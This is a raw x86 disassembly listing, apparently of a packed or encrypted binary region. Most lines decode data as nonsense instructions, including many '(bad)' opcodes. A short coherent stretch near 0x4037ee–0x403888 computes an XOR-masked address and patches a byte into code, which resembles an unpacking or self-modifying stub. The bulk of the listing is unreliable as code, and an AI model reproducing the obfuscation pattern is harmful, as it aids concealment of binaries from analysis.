  4030ee:	jmp    0x403084
  4030f0:	in     eax,dx
  4030f1:	cmp    al,bl
  4030f3:	sub    ch,BYTE PTR [edi+0x4d]
  4030f6:	sbb    eax,ecx
  4030f8:	pop    ebp
  4030f9:	push   ebx
  4030fa:	jnp    0x40311e
  4030fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030fd:	add    esp,DWORD PTR [edx]
  4030ff:	scas   al,BYTE PTR es:[di]
  403101:	rcr    DWORD PTR [edi-0x401df1fb],1
  403107:	imul   ebp,DWORD PTR [esi+0x53532383],0x42
  40310e:	mov    WORD PTR [esi+0x65],ds
  403111:	sub    dl,al
  403113:	and    ebx,eax
  403115:	jge    0x4030d0
  403117:	jnp    0x4030e8
  403119:	fnstsw WORD PTR [edi]
  40311b:	aaa    
  40311c:	or     al,0xb4
  40311e:	or     ah,BYTE PTR [edx-0x41]
  403121:	loope  0x4030bc
  403123:	ins    DWORD PTR es:[edi],dx
  403124:	sub    eax,0x3c498f01
  403129:	jno    0x403139
  40312b:	daa    
  40312c:	(bad)  
  40312d:	pop    ebx
  40312e:	imul   edi,DWORD PTR [eax+0x7f],0xffffffa2
  403132:	int    0x42
  403134:	loop   0x403181
  403136:	adc    bl,ch
  403138:	inc    ecx
  403139:	(bad)  
  40313a:	loope  0x40310e
  40313c:	xor    BYTE PTR [esi-0x2a],bl
  40313f:	fld    TBYTE PTR [ecx+0x4ede278e]
  403145:	and    eax,DWORD PTR [eax]
  403147:	mov    edi,0xdd170385
  40314c:	ds xor ah,BYTE PTR es:[ecx-0x56]
  403151:	call   0x7686:0x57ccca56
  403158:	jp     0x403131
  40315a:	or     eax,0xc6da92c9
  40315f:	in     al,dx
  403160:	mov    al,ds:0xd88f6a25
  403165:	lds    edx,FWORD PTR [edx+0x3c]
  403168:	mov    bl,0x66
  40316a:	mov    eax,0xd415a18a
  40316f:	fwait
  403170:	xchg   ebx,eax
  403171:	in     al,dx
  403172:	lahf   
  403173:	adc    eax,DWORD PTR [eax]
  403175:	or     ecx,DWORD PTR [esi]
  403177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403178:	xchg   ecx,eax
  403179:	xor    edx,DWORD PTR [ebx+0x2a]
  40317c:	dec    ecx
  40317d:	rol    DWORD PTR [edx-0x78],cl
  403180:	jb     0x403102
  403182:	xchg   ebp,eax
  403183:	add    BYTE PTR [ebx-0x17b70a6a],dl
  403189:	inc    edx
  40318a:	jl     0x403138
  40318c:	and    eax,0x4b41c687
  403191:	inc    eax
  403192:	daa    
  403193:	call   0x6bf8:0x4087d505
  40319a:	enter  0xfdb5,0x61
  40319e:	aam    0xf2
  4031a0:	or     al,0x5
  4031a2:	pop    ecx
  4031a3:	cmp    eax,0x8887603c
  4031a8:	(bad)  
  4031a9:	and    BYTE PTR [eax],cl
  4031ab:	inc    eax
  4031ac:	imul   edx,DWORD PTR [ebp-0x6048780a],0xc398df13
  4031b6:	ror    DWORD PTR [eax],1
  4031b8:	stos   BYTE PTR es:[edi],al
  4031b9:	jmp    0xa633:0xb3d705f7
  4031c0:	xor    DWORD PTR [ebp+0x3a],0xaf21c9fc
  4031c7:	mov    ebp,0x4ea5997
  4031cc:	loop   0x403158
  4031ce:	ds mov dl,0x9b
  4031d1:	int3   
  4031d2:	push   esp
  4031d3:	pop    esp
  4031d4:	xchg   ecx,eax
  4031d5:	jp     0x40319f
  4031d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031d8:	sub    BYTE PTR [edx+eiz*8],0x17
  4031dc:	das    
  4031dd:	inc    edx
  4031de:	sbb    al,0x96
  4031e0:	in     al,0x2c
  4031e2:	push   0x256c0347
  4031e7:	jno    0x403221
  4031e9:	lods   al,BYTE PTR ds:[esi]
  4031ea:	mov    BYTE PTR [ecx-0x3e],bh
  4031ed:	pushf  
  4031ee:	(bad)  
  4031ef:	repnz in eax,0xa9
  4031f2:	into   
  4031f3:	pop    edx
  4031f4:	int3   
  4031f5:	scas   al,BYTE PTR es:[edi]
  4031f6:	cmp    dl,bh
  4031f8:	jns    0x40326c
  4031fa:	add    al,0x7
  4031fc:	xchg   edx,eax
  4031fd:	fcomp  QWORD PTR [eax+0x33]
  403200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403201:	adc    BYTE PTR [ecx-0x71],bl
  403204:	jp     0x40320c
  403206:	add    ebx,DWORD PTR [ebp+0x3e408922]
  40320c:	xor    DWORD PTR [edi-0x64d352a3],0xaf9d99c5
  403216:	and    al,0x2c
  403218:	out    0x8b,al
  40321a:	add    eax,0x7d865616
  40321f:	leave  
  403220:	mov    dl,BYTE PTR [eax+0x75f9c324]
  403226:	xor    eax,0x2bd11fa7
  40322b:	inc    ebx
  40322c:	push   es
  40322d:	mov    edi,0x464a53e7
  403232:	push   ebp
  403233:	push   edi
  403234:	push   eax
  403235:	cld    
  403236:	aad    0xac
  403238:	push   ss
  403239:	mov    fs,ebp
  40323b:	nop
  40323c:	push   edi
  40323d:	or     al,0xd8
  40323f:	pop    ss
  403240:	shl    bl,0x70
  403243:	fisubr WORD PTR [esi-0xf]
  403246:	test   eax,0xaaf697a
  40324b:	lahf   
  40324c:	pop    es
  40324d:	out    dx,eax
  40324e:	lods   al,BYTE PTR ds:[esi]
  40324f:	xchg   ebp,eax
  403250:	pop    es
  403251:	xchg   ebp,eax
  403252:	std    
  403253:	xor    eax,0x284f9b81
  403258:	jge    0x4031df
  40325a:	repz in eax,dx
  40325c:	and    eax,0x359e521d
  403261:	imul   esp,DWORD PTR [edi-0x76],0xffffffa7
  403265:	dec    edi
  403266:	les    eax,FWORD PTR [ebp-0x12cfc446]
  40326c:	xchg   ebp,eax
  40326d:	sbb    ebp,DWORD PTR [esi-0x6c21d74a]
  403273:	call   0x187c:0x23ae87ca
  40327a:	jg     0x40325e
  40327c:	sbb    cl,BYTE PTR [edi-0x6eada221]
  403282:	out    0x92,eax
  403284:	gs addr16 cli 
  403287:	cmp    bh,bh
  403289:	hlt    
  40328a:	sbb    al,0x14
  40328c:	inc    edx
  40328d:	sbb    bh,dh
  40328f:	mov    bh,0xb3
  403291:	mov    cl,0xcd
  403293:	test   BYTE PTR [edx-0xe],bh
  403296:	mov    bl,0xe5
  403298:	jnp    0x4032ea
  40329a:	sub    al,0xa7
  40329c:	jg     0x4032d9
  40329e:	in     al,0xce
  4032a0:	jmp    0x4032cf
  4032a2:	and    al,0x8
  4032a4:	test   eax,0x808b859e
  4032a9:	mov    ecx,0x19711def
  4032af:	mov    dh,0x72
  4032b1:	neg    BYTE PTR [edx-0x36]
  4032b4:	cmc    
  4032b5:	aam    0xa
  4032b7:	ds jns 0x403259
  4032ba:	adc    ch,al
  4032bc:	inc    eax
  4032bd:	(bad)
  4032c1:	inc    esi
  4032c2:	test   BYTE PTR [esi],bl
  4032c4:	(bad)  
  4032c6:	test   BYTE PTR [eax+0x2f],bh
  4032c9:	stos   DWORD PTR es:[edi],eax
  4032ca:	push   ebx
  4032cb:	test   BYTE PTR [edx-0xeea4ac0],al
  4032d1:	sbb    eax,0x912c2498
  4032d6:	gs stc 
  4032d8:	int    0xb5
  4032da:	push   cs
  4032db:	jg     0x4032b2
  4032dd:	lea    ebx,[ebx+0x40]
  4032e0:	jne    0x4032dc
  4032e2:	rol    BYTE PTR [ebx],1
  4032e4:	fwait
  4032e5:	pop    ds
  4032e6:	shl    BYTE PTR [edi-0xd],0xab
  4032ea:	cld    
  4032eb:	and    eax,0xec7f57dd
  4032f0:	in     al,0x88
  4032f2:	xchg   esp,eax
  4032f3:	sti    
  4032f4:	cmp    eax,0xccecdf50
  4032f9:	cli    
  4032fa:	leave  
  4032fb:	test   DWORD PTR [edi+0x0],ebx
  4032fe:	pop    edx
  4032ff:	push   ebx
  403300:	dec    ebp
  403301:	and    al,0x3e
  403303:	push   0x3da000cd
  403308:	xor    BYTE PTR [ecx-0x1625e352],dl
  40330e:	dec    esp
  40330f:	mov    ecx,0x45048aa0
  403314:	mov    ecx,gs
  403316:	loopne 0x40333e
  403318:	mov    al,ds:0x8069e53f
  40331d:	sbb    DWORD PTR [ecx],0xffffff88
  403320:	je     0x4032bc
  403322:	jo     0x40335c
  403324:	inc    esp
  403325:	and    DWORD PTR [ecx+0x58],ebx
  403328:	cmp    cl,BYTE PTR [ecx+0x50]
  40332b:	test   eax,0x8f536dc4
  403330:	loope  0x4032d3
  403332:	call   0x8d42d5ac
  403337:	pop    eax
  403338:	je     0x403332
  40333a:	mov    ecx,0x38cae0c7
  40333f:	xchg   ebp,eax
  403340:	fs jg  0x403326
  403343:	mov    edi,0x7c31b2f9
  403348:	xlat   BYTE PTR ds:[ebx]
  403349:	(bad)  
  40334a:	popf   
  40334b:	rcr    DWORD PTR [edi+0x4f871c9a],1
  403351:	mov    edx,0xec92dec1
  403356:	adc    eax,0x5d96bbf9
  40335b:	push   edi
  40335c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40335d:	(bad)  
  40335e:	in     eax,0x55
  403360:	inc    esi
  403361:	out    0x92,eax
  403363:	xchg   DWORD PTR [ebx-0x1723a648],edx
  403369:	sbb    DWORD PTR [ebx+0x2a],esp
  40336c:	inc    esp
  40336d:	mov    WORD PTR ds:[esi+0x37],es
  403371:	mov    esi,0xb5124114
  403376:	push   ss
  403377:	sub    cl,BYTE PTR [esi+ebx*4]
  40337a:	das    
  40337b:	jl     0x4033b3
  40337d:	cmp    BYTE PTR [ecx+0x6d],ch
  403380:	mov    esi,0xe094e907
  403385:	push   esi
  403386:	and    ebx,DWORD PTR ds:0x8c46c334
  40338c:	(bad)  
  40338d:	mul    DWORD PTR [ecx]
  40338f:	outs   dx,BYTE PTR ds:[esi]
  403390:	mov    eax,0x5e753cba
  403395:	imul   eax,DWORD PTR [ebp+0x8],0xffffffc2
  403399:	shl    BYTE PTR [edi],0x79
  40339c:	jae    0x4033c3
  40339e:	or     edi,DWORD PTR [edx]
  4033a0:	out    dx,eax
  4033a1:	dec    ebx
  4033a2:	xor    bh,dh
  4033a4:	mov    al,0x2a
  4033a6:	cld    
  4033a7:	push   edx
  4033a8:	arpl   WORD PTR [esp+esi*4+0x2a],di
  4033ac:	jbe    0x403336
  4033ae:	(bad)  
  4033b0:	(bad)  
  4033b1:	adc    ebx,DWORD PTR [esi]
  4033b3:	fs mov edi,0x7f7fad65
  4033b9:	push   ebx
  4033ba:	adc    DWORD PTR [ebx+0x68],0x32e75367
  4033c1:	push   0xc726c975
  4033c6:	mov    eax,DWORD PTR [edx+eiz*1+0x36]
  4033ca:	jl     0x4033d2
  4033cc:	mov    esi,0xd0c0f512
  4033d1:	add    al,dl
  4033d3:	sbb    BYTE PTR [eax+ecx*1],dl
  4033d6:	mov    dl,0xc4
  4033d8:	dec    esp
  4033d9:	fldcw  WORD PTR [edx+0x3ee5559d]
  4033df:	xor    al,0x8b
  4033e1:	adc    eax,DWORD PTR [esi-0x16]
  4033e4:	jl     0x403453
  4033e6:	fisub  WORD PTR [eax-0x363919e2]
  4033ec:	jae    0x4033c2
  4033ee:	call   0x20a45723
  4033f3:	(bad)  
  4033f4:	xor    bl,BYTE PTR [ebp-0x6c064aa]
  4033fa:	call   0x61bc:0x4862c058
  403401:	push   ebp
  403402:	push   ecx
  403403:	xor    eax,DWORD PTR [esp+edi*4]
  403406:	cmc    
  403407:	pop    ebx
  403408:	sub    eax,0x8cd01c6b
  40340d:	push   0xd8b47387
  403412:	adc    DWORD PTR [eax],ecx
  403414:	mov    dl,0x1f
  403416:	sub    dl,dl
  403418:	adc    esp,DWORD PTR [ebx+edx*1]
  40341b:	push   ss
  40341c:	pop    es
  40341d:	sub    al,0xa
  40341f:	inc    edx
  403420:	lea    edx,[ebp-0x2d]
  403423:	xchg   esi,eax
  403424:	jne    0x403485
  403426:	cmp    eax,0xa4e3c3c6
  40342b:	stos   BYTE PTR es:[edi],al
  40342c:	lods   eax,DWORD PTR ds:[esi]
  40342d:	mov    DWORD PTR [ebp+0x6fd6b7d1],0xd9f6753b
  403437:	cvtpi2ps xmm1,QWORD PTR [ebp-0x4f3a91de]
  40343e:	xlat   BYTE PTR ds:[ebx]
  40343f:	inc    ebp
  403440:	inc    ebx
  403441:	sbb    ch,BYTE PTR [eax-0x2df2511f]
  403447:	jle    0x4034a4
  403449:	repnz fs ins DWORD PTR es:[edi],dx
  40344c:	jbe    0x4033e9
  40344e:	(bad)  
  40344f:	lods   al,BYTE PTR ds:[esi]
  403450:	ret    0x368
  403453:	mov    es,WORD PTR [esi-0x399ba100]
  403459:	jmp    0x706d:0x3d4dd8a9
  403460:	xchg   DWORD PTR [edi-0x42],ecx
  403463:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403464:	fisttp QWORD PTR [edx]
  403466:	pop    ebx
  403467:	mov    eax,ds:0x189db24a
  40346c:	cwde   
  40346d:	push   ecx
  40346e:	dec    esp
  40346f:	scas   eax,DWORD PTR es:[edi]
  403470:	(bad)  
  403471:	and    cl,BYTE PTR [edx]
  403473:	and    ebp,DWORD PTR [edx-0x52]
  403476:	leave  
  403477:	cmp    eax,0xb1929163
  40347c:	les    edi,FWORD PTR [edi]
  40347e:	(bad)  
  40347f:	popf   
  403480:	push   ss
  403481:	sbb    DWORD PTR [eax+edx*4-0x654d1b3f],esp
  403488:	daa    
  403489:	icebp  
  40348a:	rol    DWORD PTR [ebx+edi*4+0x6e],0xd5
  40348f:	jne    0x4034bd
  403491:	arpl   WORD PTR [ebp+0x8],sp
  403494:	jmp    0xd1f85a87
  403499:	shl    BYTE PTR [ecx-0x6e165de0],0x38
  4034a0:	jo     0x403468
  4034a2:	sub    dh,BYTE PTR [edi+0x719079c2]
  4034a8:	or     dh,BYTE PTR [ebp-0x28a4e7d4]
  4034ae:	(bad)  
  4034af:	mov    ebx,0x3bf52e3c
  4034b4:	(bad)  [ebp+ebp*8-0x1f]
  4034b8:	es dec ecx
  4034ba:	mov    esi,0x640c47b0
  4034bf:	shl    DWORD PTR [eax-0x4a507765],0xaa
  4034c6:	mov    al,0x20
  4034c8:	and    ebp,ecx
  4034ca:	mov    al,0x57
  4034cc:	push   esp
  4034cd:	mov    DWORD PTR [edx-0x6ebab501],esp
  4034d3:	push   eax
  4034d4:	icebp  
  4034d5:	(bad)  
  4034d6:	mov    ch,0x54
  4034d8:	push   ecx
  4034d9:	popa   
  4034da:	pop    esp
  4034db:	cmp    eax,0x15e4ffe2
  4034e0:	inc    esi
  4034e1:	mov    dl,0x1e
  4034e3:	outs   dx,DWORD PTR ds:[esi]
  4034e4:	push   0xffffff89
  4034e6:	fdivp  st(1),st
  4034e8:	stos   BYTE PTR es:[edi],al
  4034e9:	jno    0x40354f
  4034eb:	aam    0xe0
  4034ed:	add    BYTE PTR [eax+0x16157718],bh
  4034f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034f4:	pop    eax
  4034f5:	cld    
  4034f6:	sub    DWORD PTR [esi-0x6c22fb67],esi
  4034fc:	adc    cl,BYTE PTR [esi-0x45]
  4034ff:	jb     0x40357f
  403501:	lahf   
  403502:	iret   
  403503:	xor    BYTE PTR [ecx+esi*4+0x53],cl
  403507:	jnp    0x4034a2
  403509:	xor    al,0xb3
  40350b:	mov    eax,0xf29719c3
  403510:	add    BYTE PTR [ecx+esi*1-0x3dad48fb],al
  403517:	mov    ah,BYTE PTR [esi+esi*8+0x41b3c957]
  40351e:	cmp    ebp,DWORD PTR [edx]
  403520:	(bad)  
  403521:	mov    DWORD PTR [edi+0x41],edi
  403524:	fnstcw WORD PTR [eax-0x501dfc28]
  40352a:	jo     0x4034ea
  40352c:	cmp    DWORD PTR [eax],edi
  40352e:	sub    eax,0x872ea1f6
  403533:	and    esi,ebx
  403535:	add    al,0x5b
  403537:	inc    eax
  403538:	sub    al,0xc6
  40353a:	fdiv   st(3),st
  40353c:	jb     0x4034e6
  40353e:	fsubr  st(5),st
  403540:	and    DWORD PTR [edi-0x64f3bbeb],ebx
  403546:	xor    al,0xfc
  403548:	sbb    DWORD PTR ds:[esi-0x5],ecx
  40354c:	gs jns 0x403570
  40354f:	jno    0x4035a8
  403551:	push   ebx
  403552:	lods   eax,DWORD PTR ds:[esi]
  403553:	adc    al,0x32
  403555:	or     DWORD PTR [esi-0x647f803a],ebx
  40355b:	mov    ecx,0x51141825
  403560:	inc    edi
  403561:	and    ebx,edx
  403563:	push   cs
  403564:	aas    
  403565:	or     eax,0x12225da6
  40356a:	push   eax
  40356b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40356c:	push   esp
  40356d:	dec    esp
  40356e:	idiv   DWORD PTR [esi-0x2fcd1c83]
  403574:	xchg   ecx,eax
  403575:	stos   BYTE PTR es:[edi],al
  403576:	add    eax,0x4aee11bd
  40357b:	inc    ebx
  40357c:	lea    eax,[esi+0x3e164da9]
  403582:	xchg   esi,eax
  403583:	push   cs
  403584:	xchg   edx,eax
  403585:	cmp    ecx,DWORD PTR [eax+ebp*8+0x4b]
  403589:	and    BYTE PTR [edx+0x342dc89d],0x3
  403590:	sbb    esp,edx
  403592:	mov    edx,0x88807d71
  403597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403598:	xlat   BYTE PTR ds:[ebx]
  403599:	fisubr WORD PTR [ebp-0x283e7230]
  40359f:	addr16 mov bl,dh
  4035a2:	jg     0x4035af
  4035a4:	dec    esi
  4035a5:	mov    ah,0xcb
  4035a7:	xchg   esi,eax
  4035a8:	shl    ebx,1
  4035aa:	dec    esp
  4035ab:	jmp    0x40357d
  4035ad:	xchg   esi,eax
  4035ae:	sub    DWORD PTR [edx],ecx
  4035b0:	fbld   TBYTE PTR [ecx-0x70]
  4035b3:	aam    0x80
  4035b5:	in     eax,dx
  4035b6:	scas   eax,DWORD PTR es:[edi]
  4035b7:	jl     0x403587
  4035b9:	mov    ecx,0x6e6562d4
  4035be:	push   eax
  4035bf:	js     0x4035f7
  4035c1:	add    eax,0xb241f129
  4035c6:	dec    edx
  4035c7:	hlt    
  4035c8:	mov    cl,0x2a
  4035ca:	push   ecx
  4035cb:	bound  esi,QWORD PTR [edx+0xe]
  4035ce:	loop   0x40359c
  4035d0:	cmp    edi,ebx
  4035d2:	jb     0x4035e7
  4035d4:	shl    DWORD PTR [ebp-0x22],0x22
  4035d8:	mov    bh,0xc2
  4035da:	js     0x403647
  4035dc:	ret    
  4035dd:	xchg   DWORD PTR [ecx],ebp
  4035df:	add    DWORD PTR [eax-0x565f6b2c],ebx
  4035e5:	stos   BYTE PTR es:[edi],al
  4035e6:	out    0xbc,al
  4035e8:	or     ebx,DWORD PTR [ebx+0x692e9ff]
  4035ee:	frstor [ebx]
  4035f0:	in     eax,0xc0
  4035f2:	neg    BYTE PTR [ecx-0x4290923f]
  4035f8:	push   ebx
  4035f9:	mov    ds:0x50f6fc83,eax
  4035fe:	popa   
  4035ff:	xor    bl,al
  403601:	mov    DWORD PTR [ebx],esi
  403603:	dec    ecx
  403604:	mov    DWORD PTR [ecx],edx
  403606:	and    esp,esp
  403608:	xchg   ebp,eax
  403609:	push   eax
  40360a:	popf   
  40360b:	push   cs
  40360c:	or     ebp,DWORD PTR ds:0x9fd7e6ad
  403612:	cmp    BYTE PTR [ecx],0xc1
  403615:	(bad)  
  403616:	mov    al,ds:0xcda491d3
  40361b:	mul    esp
  40361d:	cwde   
  40361e:	pop    ebx
  40361f:	fwait
  403620:	dec    ebp
  403621:	xor    al,0xb4
  403623:	xor    eax,0x8527040f
  403628:	rcl    BYTE PTR [edi+edi*1+0x3b],0x3c
  40362d:	xor    BYTE PTR ds:0xeef09eb1,al
  403633:	add    dl,BYTE PTR [esi]
  403635:	pop    ds
  403636:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  403638:	clc    
  403639:	loopne 0x403676
  40363b:	sub    cl,BYTE PTR [ecx]
  40363d:	cs mov dh,0x8e
  403640:	ror    DWORD PTR ds:0x2a91a7aa,0x93
  403647:	sbb    eax,0xe1fc8e74
  40364c:	mov    edi,0x5730ef75
  403651:	mov    eax,ds:0xcf4f02a3
  403656:	xchg   ecx,eax
  403657:	jnp    0x4036cf
  403659:	push   ebx
  40365a:	jmp    0x2111088f
  40365f:	and    dx,bx
  403662:	dec    esp
  403663:	mov    ds:0x4edfd6d1,eax
  403668:	add    dh,0x80
  40366b:	mov    al,0x95
  40366d:	add    BYTE PTR [edi-0x1018a30b],bh
  403673:	in     eax,0x10
  403675:	or     BYTE PTR [ebx-0x24],0x93
  403679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40367a:	aad    0xf1
  40367c:	retf   0xd823
  40367f:	cmc    
  403680:	inc    esp
  403681:	mov    eax,ds:0xf550f648
  403686:	gs popf 
  403688:	add    edx,DWORD PTR [esi]
  40368a:	retf   
  40368b:	pop    ss
  40368c:	inc    esp
  40368d:	into   
  40368e:	jg     0x4036e5
  403690:	jo     0x4036c7
  403692:	xchg   edx,eax
  403693:	outs   dx,BYTE PTR ds:[esi]
  403694:	jb     0x75bbe8d3
  40369a:	mov    esp,0x576b1cdd
  40369f:	xchg   DWORD PTR [esi-0x133deacd],edx
  4036a5:	cs mov bl,0xba
  4036a9:	jne    0x4036e4
  4036ab:	xchg   ecx,eax
  4036ac:	cmp    dh,0x1a
  4036af:	pop    edi
  4036b0:	or     edx,ebp
  4036b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b3:	cmp    ah,BYTE PTR [eax-0x3f]
  4036b6:	fxam   
  4036b8:	stc    
  4036b9:	xchg   esi,eax
  4036ba:	jns    0x403658
  4036bc:	ret    
  4036bd:	cdq    
  4036be:	leave  
  4036bf:	mov    al,ds:0xf843ddd1
  4036c4:	sbb    eax,0x4eae6bf
  4036c9:	add    BYTE PTR [edi-0x75],cl
  4036cc:	xchg   ebx,eax
  4036cd:	int    0x4e
  4036cf:	int3   
  4036d0:	mov    BYTE PTR [esi],ah
  4036d2:	or     edi,edi
  4036d4:	xchg   ebx,eax
  4036d5:	fild   DWORD PTR [eax]
  4036d7:	mov    bl,0xc1
  4036d9:	add    ah,BYTE PTR [edx+0x7a4d2c70]
  4036df:	sahf   
  4036e0:	test   DWORD PTR es:[eax+0x3a],0x963a966a
  4036e8:	inc    edx
  4036ea:	out    0x39,al
  4036ec:	stc    
  4036ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036ee:	mov    dl,0x24
  4036f0:	push   ss
  4036f1:	loope  0x403674
  4036f3:	adc    edx,DWORD PTR [ebp-0x7628ec5]
  4036f9:	jge    0x40367b
  4036fb:	out    0xfd,al
  4036fd:	rol    DWORD PTR [eax+0x180d8212],cl
  403703:	jecxz  0x4036a2
  403705:	xchg   DWORD PTR [ecx-0x79],ebp
  403708:	sbb    ebx,DWORD PTR [edi-0xe]
  40370b:	xor    BYTE PTR [eax+0x31],bl
  40370e:	imul   esp,DWORD PTR [edx],0xffffffa7
  403711:	daa    
  403712:	cmp    al,0x26
  403714:	jmp    0x40372b
  403716:	imul   esp,DWORD PTR [edx+ebp*4+0x2f],0x32
  40371b:	aaa    
  40371c:	out    dx,eax
  40371d:	lods   al,BYTE PTR ds:[esi]
  40371e:	pop    eax
  40371f:	jmp    0x4036d0
  403721:	add    al,0x1c
  403723:	inc    esp
  403724:	jecxz  0x40370a
  403726:	mov    BYTE PTR [edi+0x4a],al
  403729:	inc    eax
  40372a:	xchg   ecx,eax
  40372b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40372c:	dec    edi
  40372d:	arpl   WORD PTR [ebp-0xa89c98e],cx
  403733:	cmp    eax,DWORD PTR [edx+0x3cc0656d]
  403739:	imul   ebx,DWORD PTR [eax],0xffffffc4
  40373c:	pop    ss
  40373d:	or     eax,0xedd2bcfe
  403742:	lds    esp,FWORD PTR [esi+esi*8]
  403745:	pop    ss
  403746:	imul   ecx,edi,0x1cda54cc
  40374c:	or     al,0x67
  40374e:	mov    eax,ds:0x9127ca3d
  403753:	pop    edx
  403754:	stos   DWORD PTR es:[edi],eax
  403755:	rol    ecx,cl
  403757:	mov    eax,0xfbf2a08c
  40375c:	and    DWORD PTR [ecx+0x5c],ecx
  40375f:	add    DWORD PTR [ebx+0x29],0xffffffcb
  403763:	rcr    BYTE PTR [ecx+ebx*2+0x219d3d0e],cl
  40376a:	aas    
  40376b:	add    WORD PTR [ebx-0x1d3b0c5e],0xcd6e
  403774:	test   BYTE PTR [esi],dh
  403776:	sub    al,0x1f
  403778:	mov    ch,0x29
  40377a:	shl    DWORD PTR [eax+0x4c],0xfa
  40377e:	mov    ebx,0x76f31dea
  403783:	sub    ebp,DWORD PTR [ecx+0x43]
  403786:	xor    al,0xd8
  403788:	mov    al,0x88
  40378a:	cmp    eax,DWORD PTR [ecx+0xc909cbb]
  403790:	inc    esi
  403791:	pop    edi
  403792:	pushf  
  403793:	jmp    0x78d9:0x97ff7aaa
  40379a:	in     eax,dx
  40379b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40379c:	mov    dh,0x1b
  40379e:	retf   
  40379f:	andps  xmm1,XMMWORD PTR [ebx+0x7b]
  4037a3:	xchg   ah,bh
  4037a5:	adc    dl,cl
  4037a7:	adc    BYTE PTR [ecx],0x3f
  4037aa:	add    bl,cl
  4037ac:	adc    edx,DWORD PTR [eax-0x64]
  4037af:	cmp    DWORD PTR [ecx+edi*2-0x605ad952],edx
  4037b6:	inc    eax
  4037b7:	ret    0x6a05
  4037ba:	mov    esi,0x4919a2be
  4037bf:	mov    dl,0x1b
  4037c1:	cmc    
  4037c2:	mov    ebp,0x54ecf8e3
  4037c7:	int3   
  4037c8:	hlt    
  4037c9:	push   ecx
  4037ca:	div    DWORD PTR [edx]
  4037cc:	ja     0x4037ca
  4037ce:	inc    esi
  4037cf:	out    0xed,al
  4037d1:	hlt    
  4037d2:	call   0x8b8858ab
  4037d7:	cmp    eax,0x476aa9dd
  4037dc:	pop    ds
  4037dd:	push   ebx
  4037de:	sbb    ecx,DWORD PTR [ebx+edx*4]
  4037e1:	popa   
  4037e2:	cmp    al,BYTE PTR [eax+0x6a]
  4037e5:	inc    ecx
  4037e6:	sub    eax,0x77510f27
  4037eb:	dec    ecx
  4037ec:	push   ds
  4037ed:	scas   al,BYTE PTR es:[edi]
  4037ee:	call   0x41ae62
  4037f3:	test   eax,eax
  4037f5:	je     0x403826
  4037fb:	lea    eax,[ebp-0x90]
  403801:	push   eax
  403802:	mov    eax,DWORD PTR [ebp-0x30]
  403805:	xor    eax,esi
  403807:	add    eax,edi
  403809:	push   eax
  40380a:	mov    eax,DWORD PTR [ebp-0x2c]
  40380d:	add    eax,0xaa
  403812:	push   eax
  403813:	mov    eax,DWORD PTR [ebp-0x2c]
  403816:	mov    eax,DWORD PTR [eax+0x198]
  40381c:	push   DWORD PTR [eax]
  40381e:	call   0x405c89
  403823:	mov    DWORD PTR [ebp-0x40],eax
  403826:	lea    eax,[ebp+0x4]
  403829:	mov    DWORD PTR [ebp-0x34],eax
  40382c:	mov    eax,DWORD PTR [ebp-0x8]
  40382f:	mov    eax,DWORD PTR [eax]
  403831:	mov    eax,DWORD PTR [eax]
  403833:	mov    eax,DWORD PTR [eax]
  403835:	test   eax,eax
  403837:	je     0x405c7a
  40383d:	lea    eax,[ebp-0xc]
  403840:	mov    DWORD PTR [ebp-0x4c],eax
  403843:	mov    eax,DWORD PTR [ebp-0x3c]
  403846:	mov    DWORD PTR [ebp-0xc],eax
  403849:	mov    eax,DWORD PTR [ebp-0x8]
  40384c:	mov    eax,DWORD PTR [eax]
  40384e:	mov    eax,DWORD PTR [eax]
  403850:	mov    eax,DWORD PTR [eax]
  403852:	sub    DWORD PTR [ebp-0xc],eax
  403855:	mov    ecx,DWORD PTR [ebp-0x10]
  403858:	xor    ecx,esi
  40385a:	mov    eax,0xffcd8d25
  40385f:	sub    eax,ecx
  403861:	add    DWORD PTR [ebp-0xc],eax
  403864:	mov    eax,DWORD PTR [ebp-0xc]
  403867:	mov    ecx,DWORD PTR [ebp-0x8]
  40386a:	mov    ecx,DWORD PTR [ecx]
  40386c:	mov    ecx,DWORD PTR [ecx]
  40386e:	mov    ecx,DWORD PTR [ecx]
  403870:	mov    DWORD PTR [ecx+0x1],eax
  403873:	mov    al,BYTE PTR [ebp-0x1]
  403876:	mov    ecx,DWORD PTR [ebp-0x8]
  403879:	mov    ecx,DWORD PTR [ecx]
  40387b:	mov    ecx,DWORD PTR [ecx]
  40387d:	mov    ecx,DWORD PTR [ecx]
  40387f:	push   DWORD PTR [ebp-0x2c]
  403882:	xor    al,0x6f
  403884:	sub    al,0xd
  403886:	mov    BYTE PTR [ecx],al
  403888:	jmp    0x405c4a
  40388d:	lods   eax,DWORD PTR ds:[esi]
  40388e:	mov    bh,0xe6
  403890:	ja     0x403876
  403892:	mov    ds:0xa508636b,eax
  403897:	fsub   QWORD PTR fs:[esp+esi*1-0x41]
  40389c:	into   
  40389d:	fstp   QWORD PTR [edi+0x62]
  4038a0:	(bad)  
  4038a1:	fstp   QWORD PTR [edi+0x62]
  4038a4:	bound  edi,QWORD PTR [edx+0x3]
  4038a7:	xor    eax,0xd6a7dd4d
  4038ac:	cmp    al,BYTE PTR [edx+0x5eadd306]
  4038b2:	or     esi,DWORD PTR [esi-0x2f]
  4038b5:	scas   eax,DWORD PTR es:[edi]
  4038b6:	pop    ds
  4038b7:	jge    0x40385f
  4038b9:	fist   WORD PTR [edx]
  4038bb:	out    0x48,eax
  4038bd:	scas   eax,DWORD PTR es:[edi]
  4038be:	sub    DWORD PTR [esi+esi*8-0x5c3c0621],edx
  4038c5:	push   0xa8a1d806
  4038ca:	pusha  
  4038cb:	xchg   edi,eax
